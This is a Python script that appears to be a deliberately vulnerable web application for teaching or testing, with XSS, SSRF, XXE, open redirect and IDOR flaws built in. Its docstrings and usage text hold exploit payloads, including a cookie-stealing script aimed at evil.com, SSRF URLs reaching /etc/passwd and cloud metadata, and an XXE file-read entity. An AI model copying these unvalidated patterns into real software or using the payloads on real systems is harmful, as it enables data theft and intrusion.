#!/usr/bin/env python3
"""
Multi-Vulnerability Web Application Simulation
CVE Patterns: CWE-79 + CWE-352 + CWE-918 + CWE-611 + CWE-601

Combines:
- Cross-Site Scripting (XSS)
- Server-Side Request Forgery (SSRF)
- XML External Entity (XXE) Injection
- Open Redirect
- Insecure Direct Object Reference (IDOR)
"""

import sys
import os
import re
import urllib.request
import urllib.parse
from xml.etree import ElementTree as ET
# Intentionally using vulnerable XML parser
from xml.dom import minidom

# ============================================
# VULNERABILITY 1: Cross-Site Scripting (CWE-79)
# ============================================

def render_page_vulnerable(title, content, username):
    """
    VULNERABLE: Reflected XSS - user input directly in HTML
    Exploit: username = "<script>alert('XSS')</script>"
    """
    # VULN: No HTML escaping on user input
    html = f"""
    <!DOCTYPE html>
    <html>
    <head><title>{title}</title></head>
    <body>
        <h1>Welcome, {username}!</h1>
        <div class="content">{content}</div>
        <p>Your profile: <a href="/user/{username}">View</a></p>
    </body>
    </html>
    """
    return html


def render_search_results(query, results):
    """
    VULNERABLE: Reflected XSS in search
    Exploit: query = "<img src=x onerror=alert('XSS')>"
    """
    # VULN: Query reflected without escaping
    html = f"<h2>Search results for: {query}</h2>\n<ul>\n"
    for r in results:
        html += f"  <li>{r}</li>\n"
    html += "</ul>"
    return html


def store_comment_vulnerable(comment, author):
    """
    VULNERABLE: Stored XSS - malicious content saved and displayed
    Exploit: comment = "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
    """
    # Simulate storing in database (just returns for demo)
    # VULN: No sanitization before storage
    stored = {
        "author": author,
        "comment": comment,
        "html": f"<div class='comment'><b>{author}</b>: {comment}</div>"
    }
    return stored


# ============================================
# VULNERABILITY 2: Server-Side Request Forgery (CWE-918)
# ============================================

def fetch_url_vulnerable(url):
    """
    VULNERABLE: SSRF - fetch arbitrary URLs from server
    Exploit: url = "file:///etc/passwd"
             url = "http://169.254.169.254/latest/meta-data/"
             url = "http://localhost:6379/CONFIG%20SET%20dir%20/tmp"
    """
    print(f"[SSRF] Fetching: {url}")
    
    # VULN: No URL validation - allows internal/file access
    try:
        response = urllib.request.urlopen(url, timeout=5)
        return response.read().decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error: {e}"


def fetch_avatar_vulnerable(user_url):
    """
    VULNERABLE: SSRF via avatar URL
    Exploit: user_url = "http://internal-server/admin/delete-all"
    """
    # VULN: Fetches URL without validation
    print(f"[SSRF] Fetching avatar from: {user_url}")
    
    try:
        req = urllib.request.Request(user_url, headers={'User-Agent': 'AvatarFetcher/1.0'})
        response = urllib.request.urlopen(req, timeout=5)
        return response.read()
    except Exception as e:
        return None


def check_url_alive(target_url):
    """
    VULNERABLE: SSRF for port scanning
    Exploit: Loop through ports - http://internal:22, http://internal:3306, etc.
    """
    # VULN: Can be used to scan internal network
    try:
        response = urllib.request.urlopen(target_url, timeout=2)
        return True, response.status
    except urllib.error.URLError as e:
        return False, str(e)
    except Exception as e:
        return False, str(e)


# ============================================
# VULNERABILITY 3: XML External Entity (CWE-611)
# ============================================

def parse_xml_vulnerable(xml_data):
    """
    VULNERABLE: XXE injection
    Exploit XML:
    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>
    """
    print("[XXE] Parsing XML data...")
    
    # VULN: Default parser allows external entities
    try:
        # Using minidom which is vulnerable to XXE by default
        doc = minidom.parseString(xml_data)
        return doc.toxml()
    except Exception as e:
        return f"Parse error: {e}"


def parse_xml_config(config_xml):
    """
    VULNERABLE: XXE in config parser
    Exploit: Include external entities to read files or SSRF
    """
    # VULN: No DTD disabled, external entities allowed
    try:
        root = ET.fromstring(config_xml)
        config = {}
        for child in root:
            config[child.tag] = child.text
        return config
    except Exception as e:
        return {"error": str(e)}


# ============================================
# VULNERABILITY 4: Open Redirect (CWE-601)
# ============================================

def redirect_vulnerable(return_url):
    """
    VULNERABLE: Open redirect
    Exploit: return_url = "https://evil-site.com/phishing"
    """
    # VULN: No validation of redirect target
    print(f"[REDIRECT] Redirecting to: {return_url}")
    
    # Simulate redirect response
    return {
        "status": 302,
        "location": return_url,
        "html": f'<meta http-equiv="refresh" content="0;url={return_url}">'
    }


def login_redirect_vulnerable(username, password, next_url):
    """
    VULNERABLE: Open redirect after login
    Exploit: next_url = "//evil.com" (protocol-relative URL)
             next_url = "https://legitimate.com@evil.com"
    """
    # Simulate authentication
    authenticated = True  # For demo
    
    if authenticated:
        # VULN: next_url not validated
        print(f"[REDIRECT] Login success, redirecting to: {next_url}")
        return redirect_vulnerable(next_url)
    else:
        return {"status": 401, "error": "Authentication failed"}


# Weak redirect validation (bypassable)
def redirect_weak_validation(url):
    """
    VULNERABLE: Weak URL validation can be bypassed
    Exploit: url = "https://trusted.com.evil.com"
             url = "https://evil.com/https://trusted.com"
             url = "javascript:alert(1)"
    """
    trusted_domain = "trusted.com"
    
    # VULN: Weak check - just looks for substring
    if trusted_domain in url:
        print(f"[REDIRECT] URL appears safe: {url}")
        return redirect_vulnerable(url)
    else:
        print(f"[REDIRECT] Blocked: {url}")
        return {"error": "Invalid redirect URL"}


# ============================================
# VULNERABILITY 5: Insecure Direct Object Reference (CWE-639)
# ============================================

# Simulated user data
USER_DATA = {
    1: {"username": "admin", "email": "admin@corp.com", "ssn": "123-45-6789", "salary": 150000},
    2: {"username": "user1", "email": "user1@corp.com", "ssn": "987-65-4321", "salary": 50000},
    3: {"username": "user2", "email": "user2@corp.com", "ssn": "456-78-9012", "salary": 60000},
}

def get_user_profile_vulnerable(user_id):
    """
    VULNERABLE: IDOR - no authorization check
    Exploit: Change user_id to access other users' data
    """
    # VULN: No check if requesting user has permission
    print(f"[IDOR] Fetching profile for user_id: {user_id}")
    
    if user_id in USER_DATA:
        # Returns ALL data including sensitive fields
        return USER_DATA[user_id]
    return {"error": "User not found"}


def download_document_vulnerable(doc_id, user_id):
    """
    VULNERABLE: IDOR in document download
    Exploit: Enumerate doc_id to access other users' documents
    """
    # Simulated document paths (predictable)
    doc_path = f"/documents/{doc_id}.pdf"
    
    # VULN: No authorization check - any user can access any document
    print(f"[IDOR] User {user_id} downloading: {doc_path}")
    return {"path": doc_path, "status": "download_started"}


# ============================================
# COMBINED ATTACK CHAIN
# ============================================

def process_webhook(data):
    """
    VULNERABLE: Multiple vulnerabilities in webhook handler
    - SSRF via callback URL
    - XXE via XML payload
    - XSS via response rendering
    """
    result = {}
    
    # VULN 1: SSRF - fetch callback URL
    if 'callback_url' in data:
        result['callback_response'] = fetch_url_vulnerable(data['callback_url'])
    
    # VULN 2: XXE - parse XML payload
    if 'xml_data' in data:
        result['xml_parsed'] = parse_xml_vulnerable(data['xml_data'])
    
    # VULN 3: XSS - render result (if served as HTML)
    if 'message' in data:
        result['rendered'] = f"<div class='webhook-result'>{data['message']}</div>"
    
    return result


def main():
    print("=" * 50)
    print("Multi-Vulnerability Web Application Demo")
    print("=" * 50)
    
    if len(sys.argv) < 2:
        print(f"\nUsage: {sys.argv[0]} <vulnerability> [args...]")
        print("\nVulnerabilities:")
        print("  xss <username>           - XSS injection demo")
        print("  ssrf <url>               - SSRF fetch URL")
        print("  xxe <xml_file>           - XXE injection")
        print("  redirect <url>           - Open redirect")
        print("  idor <user_id>           - IDOR access")
        print("\nExamples:")
        print(f"  {sys.argv[0]} xss \"<script>alert(1)</script>\"")
        print(f"  {sys.argv[0]} ssrf \"file:///etc/passwd\"")
        print(f"  {sys.argv[0]} ssrf \"http://169.254.169.254/latest/meta-data/\"")
        print(f"  {sys.argv[0]} redirect \"https://evil.com\"")
        print(f"  {sys.argv[0]} idor 1")
        return
    
    vuln = sys.argv[1]
    
    if vuln == "xss" and len(sys.argv) >= 3:
        html = render_page_vulnerable("Test", "Content", sys.argv[2])
        print("\n[XSS] Generated HTML:")
        print(html)
        
    elif vuln == "ssrf" and len(sys.argv) >= 3:
        result = fetch_url_vulnerable(sys.argv[2])
        print(f"\n[SSRF] Response:\n{result[:1000]}")
        
    elif vuln == "xxe" and len(sys.argv) >= 3:
        if os.path.exists(sys.argv[2]):
            with open(sys.argv[2], 'r') as f:
                xml_data = f.read()
        else:
            xml_data = sys.argv[2]
        result = parse_xml_vulnerable(xml_data)
        print(f"\n[XXE] Parsed result:\n{result}")
        
    elif vuln == "redirect" and len(sys.argv) >= 3:
        result = redirect_vulnerable(sys.argv[2])
        print(f"\n[REDIRECT] Response: {result}")
        
    elif vuln == "idor" and len(sys.argv) >= 3:
        user_id = int(sys.argv[2])
        result = get_user_profile_vulnerable(user_id)
        print(f"\n[IDOR] Profile data: {result}")
        
    else:
        print("Invalid vulnerability or missing arguments")


if __name__ == "__main__":
    main()

